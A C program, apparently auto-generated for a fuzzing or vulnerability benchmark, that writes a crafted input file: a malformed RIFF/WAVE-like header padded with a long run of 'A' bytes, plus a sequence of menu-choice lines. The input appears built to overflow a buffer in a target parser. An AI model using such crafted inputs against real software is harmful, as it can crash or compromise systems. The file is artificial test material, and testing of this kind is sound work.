#include<stdio.h>
#include<stdlib.h>

int main(int argc, char *argv[]){
    char *output_file_name = argv[1];
    static unsigned char write_00000_00000[] = 
         "\x6e\x62\x37\x22\x6d\x20\x3f\x34\x32\x72\x0a";
      static unsigned int write_00000_00000_len = 11;

static unsigned char write_00001_00000[] = 
         "\x31\x0a";
      static unsigned int write_00001_00000_len = 2;

static unsigned char write_00002_00000[] = 
         "\x46\x46\x49\x52\x26\x00\x00\x00\x55\x57\x46\x43\x63\x67\x63\x20"
         "\x00\xff\xff\xff\x01\x00\x02\x00\x22\x56\x00\x00\x88\x58\x01\x00"
         "\x04\x00\x10\x00\x64\x61\x74\x61\x12\x01\x00\x00\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
      static unsigned int write_00002_00000_len = 318;

static unsigned char write_00003_00000[] = 
         "\x35\x0a";
      static unsigned int write_00003_00000_len = 2;

static unsigned char write_00004_00000[] = 
         "\x36\x0a";
      static unsigned int write_00004_00000_len = 2;

static unsigned char write_00005_00000[] = 
         "\x33\x0a";
      static unsigned int write_00005_00000_len = 2;

static unsigned char write_00006_00000[] = 
         "\x35\x0a";
      static unsigned int write_00006_00000_len = 2;

static unsigned char write_00007_00000[] = 
         "\x37\x0a";
      static unsigned int write_00007_00000_len = 2;

static unsigned char write_00008_00000[] = 
         "\x36\x0a";
      static unsigned int write_00008_00000_len = 2;

static unsigned char write_00009_00000[] = 
         "\x36\x0a";
      static unsigned int write_00009_00000_len = 2;

static unsigned char write_00010_00000[] = 
         "\x34\x0a";
      static unsigned int write_00010_00000_len = 2;

static unsigned char write_00011_00000[] = 
         "\x30\x0a";
      static unsigned int write_00011_00000_len = 2;

static unsigned char write_00012_00000[] = 
         "\x39\x0a";
      static unsigned int write_00012_00000_len = 2;

    FILE *ptr = fopen(output_file_name, "wb");
    fwrite(write_00000_00000, write_00000_00000_len, 1, ptr);
    fwrite(write_00001_00000, write_00001_00000_len, 1, ptr);
    fwrite(write_00002_00000, write_00002_00000_len, 1, ptr);
    fwrite(write_00003_00000, write_00003_00000_len, 1, ptr);
    fwrite(write_00004_00000, write_00004_00000_len, 1, ptr);
    fwrite(write_00005_00000, write_00005_00000_len, 1, ptr);
    fwrite(write_00006_00000, write_00006_00000_len, 1, ptr);
    fwrite(write_00007_00000, write_00007_00000_len, 1, ptr);
    fwrite(write_00008_00000, write_00008_00000_len, 1, ptr);
    fwrite(write_00009_00000, write_00009_00000_len, 1, ptr);
    fwrite(write_00010_00000, write_00010_00000_len, 1, ptr);
    fwrite(write_00011_00000, write_00011_00000_len, 1, ptr);
    fwrite(write_00012_00000, write_00012_00000_len, 1, ptr);


    fclose(ptr);
    return 0;
}
    
